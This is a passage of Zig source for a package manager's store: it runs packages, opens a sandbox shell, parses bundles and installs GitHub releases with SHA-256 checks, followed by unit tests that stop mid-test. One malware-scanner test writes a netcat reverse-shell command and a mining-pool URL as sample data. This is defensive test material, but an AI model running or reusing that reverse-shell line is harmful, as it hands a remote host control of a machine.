        child.stdin_behavior = .Pipe;
        child.stdout_behavior = .Ignore;
        child.stderr_behavior = .Ignore;
        child.spawn() catch return false;

        if (child.stdin) |stdin| {
            stdin.writeAll(sql) catch {};
            stdin.close();
            child.stdin = null;
        }
        const term_res = child.wait() catch return false;
        return term_res == .Exited and term_res.Exited == 0;
    }

    // -----------------------------------------------------------------------
    // run / shell
    // -----------------------------------------------------------------------

    /// Resolve a user-supplied name to a package, whether they typed the
    /// package name (`ripgrep`) or the executable name (`rg`).
    pub fn resolveRequest(reg: *const registry.Registry, name: []const u8) ?Package {
        if (reg.get(name)) |p| return p;
        return reg.findByBin(name);
    }

    pub fn ensureInstalled(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        name: []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !Package {
        if (resolveRequest(reg, name)) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) {
                try self.install(pkg, platform_name, opts);
            }
            return pkg;
        }
        return self.installDynamic(a, name, platform_name, opts);
    }

    /// Path of the linked executable for `pkg`, inside ~/.abv0/bin.
    fn linkedBinPath(self: *const Store, a: std.mem.Allocator, pkg: Package) ![]u8 {
        // `abv0 run ripgrep` must launch `rg`. The original looked for a file
        // literally named after the package and failed for every package whose
        // executable differs from its name.
        const exe = pkg.primaryBin() orelse pkg.name;
        const name = try std.fmt.allocPrint(a, "{s}{s}", .{ exe, platform.exe_suffix });
        defer a.free(name);
        return std.fs.path.join(a, &.{ self.bin_root, name });
    }

    pub fn runPackage(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        name: []const u8,
        args: []const []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !u8 {
        const pkg = try self.ensureInstalled(a, reg, name, platform_name, opts);

        const bin = try self.linkedBinPath(a, pkg);
        defer a.free(bin);

        std.fs.cwd().access(bin, .{}) catch {
            term.err("{s}error{s}: '{s}' is installed but no executable is linked\n", .{ term.red, term.reset, pkg.name });
            return StoreError.ExecutableNotFound;
        };

        var argv = std.ArrayList([]const u8).init(a);
        defer argv.deinit();
        try argv.append(bin);
        try argv.appendSlice(args);

        term.flush();
        var child = std.process.Child.init(argv.items, a);
        const res = try child.spawnAndWait();
        return switch (res) {
            .Exited => |c| c,
            else => 1,
        };
    }

    pub fn spawnShell(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        names: []const []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !u8 {
        var pkgs = std.ArrayList(Package).init(a);
        defer pkgs.deinit();
        for (names) |n| {
            try pkgs.append(try self.ensureInstalled(a, reg, n, platform_name, opts));
        }

        const dir_name = try std.fmt.allocPrint(a, "shell-{d}-{d}-{x}", .{ std.time.timestamp(), platform.processId(), std.crypto.random.int(u32) });
        defer a.free(dir_name);
        const base = try std.fs.path.join(a, &.{ self.shells_root, dir_name });
        defer a.free(base);
        const sandbox_bin = try std.fs.path.join(a, &.{ base, "bin" });
        defer a.free(sandbox_bin);

        try platform.makeSecureDir(sandbox_bin);
        defer std.fs.cwd().deleteTree(base) catch {};

        for (pkgs.items) |pkg| {
            for (pkg.bin) |b| {
                const fname = try std.fmt.allocPrint(a, "{s}{s}", .{ b, platform.exe_suffix });
                defer a.free(fname);
                const src = try std.fs.path.join(a, &.{ self.bin_root, fname });
                defer a.free(src);
                const dst = try std.fs.path.join(a, &.{ sandbox_bin, fname });
                defer a.free(dst);
                _ = platform.fastLink(src, dst) catch continue;
                if (comptime platform.is_windows) {
                    // A launcher exe is useless without the .shim beside it.
                    const sname = try std.fmt.allocPrint(a, "{s}{s}", .{ b, shim.shim_suffix });
                    defer a.free(sname);
                    const ssrc = try std.fs.path.join(a, &.{ self.bin_root, sname });
                    defer a.free(ssrc);
                    const sdst = try std.fs.path.join(a, &.{ sandbox_bin, sname });
                    defer a.free(sdst);
                    _ = platform.fastLink(ssrc, sdst) catch {};
                }
            }
        }

        var env = try std.process.getEnvMap(a);
        defer env.deinit();

        const sep = if (platform.is_windows) ";" else ":";
        const old_path = env.get("PATH") orelse "";
        const new_path = try std.fmt.allocPrint(a, "{s}{s}{s}", .{ sandbox_bin, sep, old_path });
        defer a.free(new_path);
        try env.put("PATH", new_path);
        try env.put("ABV0_SHELL", "1");

        const shell = try platform.defaultShell(a);
        defer a.free(shell);

        term.print("{s}entering abv0 sandbox shell{s} - type 'exit' to leave\n", .{ term.magenta, term.reset });
        term.flush();

        var child = std.process.Child.init(&.{shell}, a);
        child.env_map = &env;
        const res = try child.spawnAndWait();

        term.print("{s}sandbox dissolved{s}\n", .{ term.dim, term.reset });
        return switch (res) {
            .Exited => |c| c,
            else => 1,
        };
    }

    // -----------------------------------------------------------------------
    // Bundle
    // -----------------------------------------------------------------------

    /// Streaming, line-by-line Brewfile parser.
    ///
    /// The v1.5.0 changelog claims a "Streaming Zero-Allocation Bundle Parser"
    /// built on std.io.bufferedReader. The code actually called
    /// readToEndAlloc(2 MB). This is the advertised implementation.
    /// Returns the registry names the file asks for, in file order, with unknown
    /// names skipped. Nothing is installed here. The caller plans and runs the
    /// list, so a bundle gets dependency order and the parallel installer.
    pub fn bundleInstall(
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        file_path: []const u8,
    ) ![]const []const u8 {
        const file = std.fs.cwd().openFile(file_path, .{}) catch |e| {
            term.err("{s}error{s}: cannot open bundle '{s}': {s}\n", .{ term.red, term.reset, file_path, @errorName(e) });
            return e;
        };
        defer file.close();

        var buffered = std.io.bufferedReader(file.reader());
        const reader = buffered.reader();

        var line_buf: [4096]u8 = undefined;
        var names = std.ArrayList([]const u8).init(a);
        defer names.deinit();

        var line_no: usize = 0;
        while (true) {
            const maybe = reader.readUntilDelimiterOrEof(&line_buf, '\n') catch |e| switch (e) {
                error.StreamTooLong => {
                    line_no += 1;
                    term.err("{s}warning{s}: {s}:{d} line too long, skipped\n", .{ term.yellow, term.reset, file_path, line_no });
                    continue;
                },
                else => return e,
            };
            const raw = maybe orelse break;
            line_no += 1;

            const line = std.mem.trim(u8, raw, " \t\r");
            if (line.len == 0 or line[0] == '#') continue;

            var parts = std.mem.tokenizeAny(u8, line, " \t");
            const first = parts.next() orelse continue;

            const candidate = if (std.mem.eql(u8, first, "brew") or std.mem.eql(u8, first, "cask"))
                (parts.next() orelse continue)
            else
                first;

            const name = std.mem.trim(u8, candidate, "\"',");
            if (name.len == 0) continue;

            if (resolveRequest(reg, name) == null) {
                term.err("{s}warning{s}: {s}:{d} unknown package '{s}', skipped\n", .{ term.yellow, term.reset, file_path, line_no, name });
                continue;
            }
            try names.append(try a.dupe(u8, name));
        }

        return names.toOwnedSlice();
    }

    pub fn bundleDump(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        file_path: []const u8,
        force: bool,
        platform_name: []const u8,
    ) !void {
        if (!force) {
            if (std.fs.cwd().access(file_path, .{})) |_| {
                term.err("{s}error{s}: '{s}' exists; pass --force to overwrite\n", .{ term.red, term.reset, file_path });
                return;
            } else |_| {}
        }

        const file = try std.fs.cwd().createFile(file_path, .{ .mode = platform.mode_public });
        defer file.close();
        var bw = std.io.bufferedWriter(file.writer());
        const w = bw.writer();

        try w.print("# Generated by abv0 for {s}\n", .{platform_name});
        var count: usize = 0;
        for (reg.packages) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) continue;
            const kw = if (pkg.app_bundles.len > 0) "cask" else "brew";
            try w.print("{s} \"{s}\"\n", .{ kw, pkg.name });
            count += 1;
        }
        try bw.flush();
        _ = a;
        term.print("exported {d} packages to {s}\n", .{ count, file_path });
    }

    // -----------------------------------------------------------------------
    // GitHub releases
    // -----------------------------------------------------------------------

    /// Install something the registry does not list. Only a GitHub spec
    /// (`gh:owner/repo[@tag]`, or `owner/repo`) is accepted: abv0 no longer
    /// guesses a repository from a bare name, because a guess cannot be checked
    /// against anything and name-similar repositories are a known attack.
    pub fn installDynamic(
        self: *Store,
        a: std.mem.Allocator,
        name: []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !Package {
        if (ghverify.looksLikeSpec(name)) return self.installGithub(a, name, platform_name, opts);

        if (safepath.isValidId(name)) {
            term.err(
                \\{s}error{s}: '{s}' is not in the catalog
                \\  to install a project's own GitHub release: abv0 install gh:<owner>/{s}
                \\
            , .{ term.red, term.reset, name, name });
        } else {
            term.err("{s}error{s}: '{s}' is not in the catalog\n", .{ term.red, term.reset, name });
        }
        return StoreError.NotInCatalog;
    }

    /// Install a project's prebuilt release from GitHub, with no recipe.
    ///
    /// The release's asset for `platform_name` is chosen by file name, and its
    /// SHA-256 comes from GitHub's own `digest` for the asset, or else from a
    /// checksums file in the same release. A mismatch installs nothing. With
    /// neither, the install is refused unless `opts.allow_unverified`.
    ///
    /// The programs are found by looking inside the unpacked archive
    /// (`bindetect`), so nobody has to say what the package provides. The
    /// store directory is `<repo>@<tag>@<platform>` and holds a `.abv0-source`
    /// file naming `gh:owner/repo@tag`, which is how list, uninstall, outdated
    /// and upgrade know where it came from.
    pub fn installGithub(
        self: *Store,
        a: std.mem.Allocator,
        spec_text: []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !Package {
        if (!safepath.isValidId(platform_name)) return StoreError.InvalidPackageIdentifier;

        const spec = ghrelease.parseSpec(spec_text) orelse {
            term.err(
                "{s}error{s}: '{s}' is not a GitHub project; write gh:owner/repo or gh:owner/repo@tag\n",
                .{ term.red, term.reset, spec_text },
            );
            return StoreError.InvalidGithubSpec;
        };

        // ---- which release, which asset ----
        var api_message: ?[]const u8 = null;
        const rel = fetchGithubRelease(a, spec, &api_message) catch |e| {
            const at: []const u8 = if (spec.tag != null) "@" else "";
            term.err("{s}error{s}: cannot read the release of gh:{s}/{s}{s}{s}\n", .{
                term.red, term.reset, spec.owner, spec.repo, at, spec.tag orelse "",
            });
            if (api_message) |m| {
                term.err("  GitHub says: {s}\n", .{m});
            } else if (e == net.Error.DownloadFailed) {
                term.err("  the repository or release does not exist, is private, or GitHub's rate limit is used up\n" ++
                    "  (60 requests an hour without a token; set GITHUB_TOKEN to raise it)\n", .{});
            } else {
                term.err("  {s}\n", .{@errorName(e)});
            }
            return StoreError.ReleaseUnavailable;
        };
        return self.installRelease(a, spec, rel, platform_name, opts);
    }

    /// `installGithub` once the release is in hand: choose the asset, decide
    /// how it is verified, unpack it, find and link its programs.
    fn installRelease(
        self: *Store,
        a: std.mem.Allocator,
        spec: ghrelease.Spec,
        rel: ghrelease.Release,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !Package {
        const idx = ghrelease.pickAsset(rel.assets, platform_name) orelse {
            term.err("{s}error{s}: release {s} of {s}/{s} has no asset for {s}\n", .{
                term.red, term.reset, rel.tag, spec.owner, spec.repo, platform_name,
            });
            if (rel.assets.len > 0) {
                term.err("  its assets:", .{});
                for (rel.assets[0..@min(rel.assets.len, 8)]) |asset| term.err(" {s}", .{asset.name});
                term.err("{s}\n", .{if (rel.assets.len > 8) " ..." else ""});
            }
            return StoreError.NoMatchingAsset;
        };
        const asset = rel.assets[idx];
        const kind = ghrelease.archiveKindOf(asset.name) orelse return StoreError.NoMatchingAsset;

        // ---- how it will be verified ----
        var from_file: ?ghverify.Hex = null;
        if (asset.sha256 == null) from_file = checksumFromRelease(a, rel.assets, idx);
        const decision = ghverify.decide(asset.sha256, from_file, opts.allow_unverified);
        if (decision == .refused) {
            term.err(
                \\{s}error{s}: GitHub publishes no sha256 for {s}: it has no digest, and the release has no checksums file.
                \\  Installing it would execute unverified code.
                \\  Re-run with --allow-unverified to accept that risk.
                \\
            , .{ term.red, term.reset, asset.name });
            return StoreError.RefusedUnverifiedInstall;
        }

        // ---- what it will be called ----
        const version = try ghverify.versionFromTag(a, rel.tag);
        const is_raw = std.mem.eql(u8, kind, "raw");
        const raw_name = if (is_raw and std.mem.endsWith(u8, platform_name, "-windows"))
            try std.fmt.allocPrint(a, "{s}.exe", .{spec.repo})
        else
            spec.repo;

        const plats = try a.alloc(registry.PlatformInfo, 1);
        plats[0] = .{
            .name = platform_name,
            .url = asset.url,
            .sha256 = switch (decision) {
                .verified => |v| try a.dupe(u8, &v.hex),
                else => registry.sha256_skip,
            },
            .archive_type = kind,
            .bin_path = if (is_raw) raw_name else "",
        };
        var pkg = Package{
            .name = spec.repo,
            .version = version,
            .description = try std.fmt.allocPrint(a, "GitHub release of {s}/{s}", .{ spec.owner, spec.repo }),
            .homepage = try std.fmt.allocPrint(a, "https://github.com/{s}/{s}", .{ spec.owner, spec.repo }),
            .license = "unknown",
            .platforms = plats,
        };
        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
        const note = try ghverify.sourceNote(a, spec.owner, spec.repo, rel.tag);

        if (!opts.quiet) {
            term.print("  {s}source{s}   gh:{s}/{s}@{s} {s}({s}){s}\n", .{
                term.cyan, term.reset, spec.owner, spec.repo, rel.tag, term.dim, asset.name, term.reset,
            });
        }
        switch (decision) {
            .verified => |v| if (!opts.quiet) {
                term.print("  {s}verify{s}   sha256 ({s})\n", .{ term.green, term.reset, v.source.label() });
            },
            // Never silent, even under --quiet: this is the one line that says
            // the download was not checked.
            else => term.err("  {s}verify{s}   {s}UNVERIFIED (--allow-unverified){s}\n", .{ term.yellow, term.reset, term.yellow, term.reset }),
        }

        var guard = try Guard.acquire(a, self.locks_root, pkg.name);
        defer guard.release();

        // Another project that happens to share the repository name must not
        // silently take over the same package.
        if (!opts.force) {
            if (self.conflictingSource(a, pkg.name, spec, platform_name)) |other| {
                term.err(
                    "{s}error{s}: '{s}' is already installed from gh:{s}/{s}, not gh:{s}/{s}\n  Uninstall it first, or re-run with --force.\n",
                    .{ term.red, term.reset, pkg.name, other.owner, other.repo, spec.owner, spec.repo },
                );
                return StoreError.BinaryConflict;
            }
        }

        var w = try wal.Wal.init(a, self.store_root, pkg.name);
        defer w.deinit();

        // A hash we hold must never be waved through by --allow-unverified.
        var run_opts = opts;
        run_opts.allow_unverified = decision == .unverified;
        run_opts.source_note = note;

        const cached = self.isInstalled(pkg, platform_name) and self.installedFrom(a, pkg_dir, spec);
        if (!cached) {
            try self.fetchAndUnpack(a, pkg, plats[0], pkg_dir, run_opts, &w);
        } else if (!opts.quiet) {
            term.print("  {s}cached{s}  {s} {s}\n", .{ term.dim, term.reset, pkg.name, pkg.version });
        }

        // ---- which files are the programs ----
        try w.append(.link);
        const bins = try detectBins(a, pkg_dir, spec.repo, raw_name, is_raw, platform_name);
        if (bins.len == 0) {
            term.err("{s}error{s}: no executables found in {s}; nothing was linked\n", .{ term.red, term.reset, asset.name });
            if (!cached) std.fs.cwd().deleteTree(pkg_dir) catch {};
            return StoreError.ExecutableNotFound;
        }

        var plans = std.ArrayList(LinkPlan).init(a);
        var names = std.ArrayList([]const u8).init(a);
        for (bins) |b| {
            if (isReservedBin(b.name)) {
                term.err("{s}warning{s}: '{s}' is reserved for abv0 itself; not linking it\n", .{ term.yellow, term.reset, b.name });
                continue;
            }
            const src = try safepath.joinSafe(a, pkg_dir, b.path);
            const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ b.name, platform.exe_suffix });
            const dst = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
            try plans.append(.{ .bin = b.name, .src = src, .dst = dst });
            try names.append(b.name);
        }
        pkg.bin = try names.toOwnedSlice();

        const linked = try self.linkPlans(a, pkg, plans.items, opts);
        try w.append(.complete);
        if (linked == 0) {
            term.err("{s}warning{s}: no executables from '{s}' could be linked\n", .{ term.yellow, term.reset, pkg.name });
        }
        return pkg;
    }

    /// The programs in an installed tree, best first and at most
    /// `bindetect.max_bins`. A single raw download is the program itself, named
    /// after the repository, whatever its bytes look like.
    fn detectBins(
        a: std.mem.Allocator,
        pkg_dir: []const u8,
        repo: []const u8,
        raw_name: []const u8,
        is_raw: bool,
        platform_name: []const u8,
    ) ![]bindetect.Bin {
        if (is_raw) {
            const path = try std.fs.path.join(a, &.{ pkg_dir, raw_name });
            if (!isPlainFile(path)) return a.alloc(bindetect.Bin, 0);
            const only = try a.alloc(bindetect.Bin, 1);
            only[0] = .{ .path = raw_name, .name = repo };
            return only;
        }
        var dir = std.fs.cwd().openDir(pkg_dir, .{ .iterate = true }) catch return a.alloc(bindetect.Bin, 0);
        defer dir.close();
        const found = try bindetect.findExecutables(a, dir, osTagOf(platform_name));
        bindetect.rank(found, repo);
        return bindetect.top(found);
    }

    fn osTagOf(platform_name: []const u8) std.Target.Os.Tag {
        if (std.mem.endsWith(u8, platform_name, "-macos")) return .macos;
        if (std.mem.endsWith(u8, platform_name, "-windows")) return .windows;
        return .linux;
    }

    /// The SHA-256 of `assets[idx]` from a checksums file published in the same
    /// release, or null when there is none or it does not list the asset.
    fn checksumFromRelease(a: std.mem.Allocator, assets: []const ghrelease.Asset, idx: usize) ?ghverify.Hex {
        const cands = ghverify.checksumCandidates(a, assets, idx) catch return null;
        const wanted = assets[idx].name;
        for (cands) |ci| {
            const cand = assets[ci];
            const text = net.fetchToString(a, cand.url, 2 * 1024 * 1024, .{}) catch continue;
            if (ghverify.findChecksum(text, wanted, ghverify.isDedicated(wanted, cand.name))) |h| return h;
        }
        return null;
    }

    /// `GITHUB_TOKEN`, else `GH_TOKEN`, when it is a plausible token. Only
    /// plain token characters are accepted, so the value can never add a header
    /// line.
    fn githubToken(a: std.mem.Allocator) ?[]const u8 {
        for ([_][]const u8{ "GITHUB_TOKEN", "GH_TOKEN" }) |key| {
            const v = platform.envOwned(a, key) orelse continue;
            const t = std.mem.trim(u8, v, " \t\r\n");
            if (t.len == 0 or t.len > 512) continue;
            for (t) |c| {
                if (!std.ascii.isAlphanumeric(c) and c != '_' and c != '-' and c != '.') break;
            } else return t;
        }
        return null;
    }

    /// The release JSON for a spec. Debug builds (which includes `zig build
    /// test`) read `$ABV0_GH_FIXTURE_DIR/<owner>__<repo>__<tag|latest>.json`
    /// instead of calling the API, so the whole flow can run offline against
    /// real asset URLs; release builds ignore that variable.
    fn githubApiBody(a: std.mem.Allocator, spec: ghrelease.Spec) ![]u8 {
        if (comptime builtin.mode == .Debug) {
            if (platform.envOwned(a, "ABV0_GH_FIXTURE_DIR")) |dir| {
                const which = if (spec.tag) |t| try ghverify.versionFromTag(a, t) else "latest";
                const file = try std.fmt.allocPrint(a, "{s}__{s}__{s}.json", .{ spec.owner, spec.repo, which });
                const path = try std.fs.path.join(a, &.{ dir, file });
                return std.fs.cwd().readFileAlloc(a, path, 8 * 1024 * 1024);
            }
        }

        const url = try ghrelease.apiUrl(a, spec.owner, spec.repo, spec.tag);
        var headers = std.ArrayList([]const u8).init(a);
        try headers.append("Accept: application/vnd.github+json");
        if (githubToken(a)) |tok| {
            try headers.append(try std.fmt.allocPrint(a, "Authorization: Bearer {s}", .{tok}));
        }
        return net.fetchToString(a, url, 8 * 1024 * 1024, .{ .headers = headers.items });
    }

    /// Fetch and parse a release. `message` receives GitHub's own explanation
    /// when the API answers with an error object instead of a release.
    fn fetchGithubRelease(a: std.mem.Allocator, spec: ghrelease.Spec, message: *?[]const u8) !ghrelease.Release {
        const body = try githubApiBody(a, spec);
        return ghrelease.parseRelease(a, body) catch |e| {
            if (e == error.GitHubApiMessage) {
                if (std.json.parseFromSliceLeaky(std.json.Value, a, body, .{})) |root| {
                    if (root == .object) {
                        if (root.object.get("message")) |m| {
                            if (m == .string) message.* = m.string;
                        }
                    }
                } else |_| {}
            }
            return e;
        };
    }

    /// The spec recorded in a store directory's `.abv0-source`, if it has one.
    fn readSource(a: std.mem.Allocator, dir_path: []const u8) ?ghrelease.Spec {
        const p = std.fs.path.join(a, &.{ dir_path, source_file }) catch return null;
        const text = std.fs.cwd().readFileAlloc(a, p, 1024) catch return null;
        return ghverify.parseSourceNote(text);
    }

    fn sameProject(x: ghrelease.Spec, y: ghrelease.Spec) bool {
        return std.ascii.eqlIgnoreCase(x.owner, y.owner) and std.ascii.eqlIgnoreCase(x.repo, y.repo);
    }

    /// Whether `pkg_dir` was installed from the project `spec` names.
    fn installedFrom(self: *const Store, a: std.mem.Allocator, pkg_dir: []const u8, spec: ghrelease.Spec) bool {
        _ = self;
        const have = readSource(a, pkg_dir) orelse return false;
        return sameProject(have, spec);
    }

    /// Another GitHub project already installed under the package name `name`.
    fn conflictingSource(self: *const Store, a: std.mem.Allocator, name: []const u8, spec: ghrelease.Spec, platform_name: []const u8) ?ghrelease.Spec {
        const dirs = self.installedVersions(a, name, platform_name) catch return null;
        for (dirs) |d| {
            const p = std.fs.path.join(a, &.{ self.store_root, d.dir_name }) catch continue;
            const have = readSource(a, p) orelse continue;
            if (!sameProject(have, spec)) return have;
        }
        return null;
    }

    /// One package in the store that came from GitHub.
    pub const GhEntry = struct {
        name: []const u8,
        /// The store version (the tag, made safe for a directory name).
        version: []const u8,
        owner: []const u8,
        repo: []const u8,
        /// The release tag it was installed from, exactly as GitHub names it.
        tag: []const u8,
    };

    /// The GitHub installs for `platform_name`, newest version of each package.
    /// Everything is allocated from `a`.
    pub fn githubInstalled(self: *const Store, a: std.mem.Allocator, platform_name: []const u8) ![]GhEntry {
        var scan_arena = std.heap.ArenaAllocator.init(a);
        defer scan_arena.deinit();
        const index = try self.scanStore(scan_arena.allocator());

        var out = std.ArrayList(GhEntry).init(a);
        errdefer out.deinit();
        var it = index.iterator();
        while (it.next()) |kv| {
            var best: ?GhEntry = null;
            for (kv.value_ptr.items) |e| {
                if (!std.mem.eql(u8, e.platform, platform_name)) continue;
                const dir_path = try std.fs.path.join(a, &.{ self.store_root, e.dir_name });
                const spec = readSource(a, dir_path) orelse continue;
                if (!std.ascii.eqlIgnoreCase(spec.repo, kv.key_ptr.*)) continue;
                if (best) |b| {
                    if (registry.compareVersions(e.version, b.version) != .gt) continue;
                }
                best = .{
                    .name = try a.dupe(u8, kv.key_ptr.*),
                    .version = try a.dupe(u8, e.version),
                    .owner = spec.owner,
                    .repo = spec.repo,
                    .tag = spec.tag.?,
                };
            }
            if (best) |b| try out.append(b);
        }
        std.mem.sort(GhEntry, out.items, {}, struct {
            fn less(_: void, x: GhEntry, y: GhEntry) bool {
                return std.mem.order(u8, x.name, y.name) == .lt;
            }
        }.less);
        return out.toOwnedSlice();
    }

    pub const GhOutdated = struct {
        entry: GhEntry,
        /// The newest release's tag.
        latest_tag: []const u8,
    };

    /// GitHub installs whose project has published a newer release. One API
    /// call per package. A project that cannot be reached is reported and
    /// skipped, not treated as up to date or as outdated.
    pub fn getOutdatedGithub(self: *const Store, a: std.mem.Allocator, platform_name: []const u8) ![]GhOutdated {
        const entries = try self.githubInstalled(a, platform_name);
        defer a.free(entries);

        var out = std.ArrayList(GhOutdated).init(a);
        errdefer out.deinit();
        for (entries) |e| {
            var message: ?[]const u8 = null;
            const rel = fetchGithubRelease(a, .{ .owner = e.owner, .repo = e.repo, .tag = null }, &message) catch |err| {
                term.err("{s}warning{s}: cannot check gh:{s}/{s}: {s}\n", .{
                    term.yellow, term.reset, e.owner, e.repo, message orelse @errorName(err),
                });
                continue;
            };
            const latest = ghverify.versionFromTag(a, rel.tag) catch continue;
            if (std.mem.eql(u8, latest, e.version)) continue;
            if (registry.compareVersions(e.version, latest) == .gt) continue;
            try out.append(.{ .entry = e, .latest_tag = rel.tag });
        }
        return out.toOwnedSlice();
    }

    /// Remove every installed version of `name` for `platform_name` except
    /// `keep_version`. `upgrade` calls this only after the new version has
    /// installed, so a failed download never leaves the package with nothing.
    /// Bin links are not touched: the new version's install has already
    /// relinked them, and removing them here would break the live command.
    pub fn pruneOtherVersions(
        self: *Store,
        a: std.mem.Allocator,
        name: []const u8,
        keep_version: []const u8,
        platform_name: []const u8,
    ) !usize {
        if (!safepath.isValidId(name)) return StoreError.InvalidPackageIdentifier;

        const dirs = try self.installedVersions(a, name, platform_name);
        defer a.free(dirs);

        var removed: usize = 0;
        for (dirs) |d| {
            if (std.mem.eql(u8, d.version, keep_version)) continue;
            const p = try std.fs.path.join(a, &.{ self.store_root, d.dir_name });
            defer a.free(p);
            if (std.fs.cwd().deleteTree(p)) |_| {
                removed += 1;
            } else |_| {}
        }
        return removed;
    }

    /// Package that owns bin `bin_name` in `state/bin-owners`, or null when abv0
    /// does not manage it. The returned slice is allocated from `a`.
    pub fn binOwnerOf(self: *const Store, a: std.mem.Allocator, bin_name: []const u8) !?[]const u8 {
        var owners: Owners = undefined;
        try self.readOwners(&owners, a);
        defer owners.deinit();
        const owner = ownerOf(owners.recs.items, "bin", bin_name) orelse return null;
        return try a.dupe(u8, owner);
    }
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

const testing = std.testing;

test "storeDirName rejects hostile identifiers" {
    const a = testing.allocator;

    const ok = try Store.storeDirName(a, .{ .name = "jq", .version = "1.7.1" }, "x86_64-linux");
    defer a.free(ok);
    try testing.expectEqualStrings("jq@1.7.1@x86_64-linux", ok);

    try testing.expectError(
        StoreError.InvalidPackageIdentifier,
        Store.storeDirName(a, .{ .name = "../../etc", .version = "1.0" }, "x86_64-linux"),
    );
    try testing.expectError(
        StoreError.InvalidPackageIdentifier,
        Store.storeDirName(a, .{ .name = "jq", .version = "../.." }, "x86_64-linux"),
    );
    try testing.expectError(
        StoreError.InvalidPackageIdentifier,
        Store.storeDirName(a, .{ .name = "jq", .version = "1.0" }, "../../../tmp"),
    );
}

test "scanFile scores known malware patterns and stays clean otherwise" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    const bad = try std.fs.path.join(testing.allocator, &.{ root, "bad.sh" });
    defer testing.allocator.free(bad);
    {
        const f = try std.fs.cwd().createFile(bad, .{});
        defer f.close();
        try f.writeAll("#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\nstratum+tcp://pool.example:3333\n");
    }
    var t1 = try Store.scanFile(testing.allocator, bad);
    defer t1.deinit();
    try testing.expect(t1.score >= 90);
    try testing.expect(t1.reasons.items.len >= 2);

    const good = try std.fs.path.join(testing.allocator, &.{ root, "good.sh" });
    defer testing.allocator.free(good);
    {
        const f = try std.fs.cwd().createFile(good, .{});
        defer f.close();
        try f.writeAll("#!/bin/sh\necho hello world\n");
    }
    var t2 = try Store.scanFile(testing.allocator, good);
    defer t2.deinit();
    try testing.expectEqual(@as(u32, 0), t2.score);
}

test "scanFile catches a signature straddling a read boundary" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    const p = try std.fs.path.join(testing.allocator, &.{ root, "split.bin" });
    defer testing.allocator.free(p);

    {
        const f = try std.fs.cwd().createFile(p, .{});
        defer f.close();
        // Land "stratum+tcp://" exactly across the 256 KiB chunk boundary.
        const pad = 256 * 1024 - 7;
        const filler = try testing.allocator.alloc(u8, pad);
        defer testing.allocator.free(filler);
        @memset(filler, 'A');
        try f.writeAll(filler);
        try f.writeAll("stratum+tcp://pool");
    }

    var t = try Store.scanFile(testing.allocator, p);
    defer t.deinit();
    try testing.expect(t.score > 0);
}

test "digestFile hashes in one pass and keeps the leading bytes" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    const p = try std.fs.path.join(testing.allocator, &.{ root, "payload.bin" });
    defer testing.allocator.free(p);

    // Several 64 KiB reads, so the digest really spans more than one buffer.
    const data = try testing.allocator.alloc(u8, 300 * 1024 + 17);
    defer testing.allocator.free(data);
    for (data, 0..) |*b, i| b.* = @truncate(i *% 131 +% (i >> 8));
    try tmp.dir.writeFile(.{ .sub_path = "payload.bin", .data = data });

    var d = try Store.digestFile(p);
    var want: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(data, &want, .{});
    const got = d.final();
    try testing.expectEqualSlices(u8, &want, &got);
    try testing.expectEqualSlices(u8, data[0..archive.head_len], d.head());
}

test "micro-split reassembly hashes exactly the bytes it writes" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    var h = std.crypto.hash.sha2.Sha256.init(.{});
    var names: [3][]u8 = undefined;
    for (&names, 0..) |*name, i| {
        const body = try testing.allocator.alloc(u8, 100_000 + i);
        defer testing.allocator.free(body);
        @memset(body, @as(u8, 'a') + @as(u8, @intCast(i)));
        const sub = try std.fmt.allocPrint(testing.allocator, "chunk.{d}", .{i});
        defer testing.allocator.free(sub);
        try tmp.dir.writeFile(.{ .sub_path = sub, .data = body });
        h.update(body);
        name.* = try std.fs.path.join(testing.allocator, &.{ root, sub });
    }
    defer for (names) |n| testing.allocator.free(n);

    const dest = try std.fs.path.join(testing.allocator, &.{ root, "joined.bin" });
    defer testing.allocator.free(dest);
    var parts: [3][]const u8 = undefined;
    for (names, 0..) |n, i| parts[i] = n;

    var d = try Store.reassemble(dest, &parts);
    var want: [32]u8 = undefined;
    h.final(&want);
    const got = d.final();
    try testing.expectEqualSlices(u8, &want, &got);
}

test "scanFile finds a signature straddling the first read boundary" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    const p = try std.fs.path.join(testing.allocator, &.{ root, "boundary.bin" });
    defer testing.allocator.free(p);

    // The first read fills the whole buffer, so its end is the first boundary.
    // Every start that makes the longest signature cross it must be caught.
    const pattern = "AWS_SECRET_ACCESS_KEY";
    const boundary = Store.scan_chunk + Store.scan_overlap;
    const data = try testing.allocator.alloc(u8, boundary + 4096);
    defer testing.allocator.free(data);

    var offset: usize = boundary - pattern.len + 1;
    while (offset < boundary) : (offset += 1) {
